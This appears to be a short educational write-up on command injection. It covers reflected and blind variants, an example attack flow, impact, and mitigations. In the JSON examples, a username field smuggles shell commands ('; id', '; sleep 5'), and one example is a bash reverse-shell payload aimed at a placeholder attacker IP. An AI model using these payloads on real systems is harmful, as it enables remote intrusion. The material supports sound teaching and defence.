# Command Injection
A vulnerability where an application passes unsafe user input to a system shell or command execution function, allowing an attacker to execute arbitrary commands on the host operating system.

## Vulnerability
- User-controlled input is concatenated or injected directly into system commands.
- Input is not properly sanitized, validated, or escaped before execution.
- Can occur in web applications, APIs, or scripts that interact with the operating system.

##Types

### 1. Regular (Reflected) Command Injection
The output of the injected command is returned directly in the `HTTP` response or application interface.

Example:
```json
{"username": "test; id"}
```
Server executes the command and returns: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Immediate feedback confirms successful injection.

### 2. Blind Command Injection
The output of the injected command is not returned to the attacker.

Requires indirect verification, such as time-based payloads (e.g., `sleep 5`)

Example:
```json
{"username": "test; sleep 5"}
```
Noticeable delay in server response confirms command execution.

## Example Attack Flow
- Attacker gains admin or elevated privileges due to broken access control.
- Finds an endpoint that executes system commands (e.g., generating VPN files).
- Tests injection with benign commands (id, sleep 5) to confirm vulnerability.
- Executes a reverse shell payload to gain remote access:
```json
{
"username": "attacker; bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
}
```
Receives shell on attacker machine (Netcat listener), establishing full system access under the web user context.

## Impact
Full remote command execution on the host system under the privileges of the application process.

Can lead to:
- Data exfiltration
- Local privilege escalation
- Pivoting within the internal network

## Mitigations
- Never pass user input directly into system commands.
- Use safe APIs or libraries to handle command execution (e.g., execFile in Node.js, subprocess.run in Python with argument lists).
- Validate, sanitize, or whitelist all input before processing.
- Restrict the application’s OS privileges; drop unnecessary permissions to contain potential compromise.
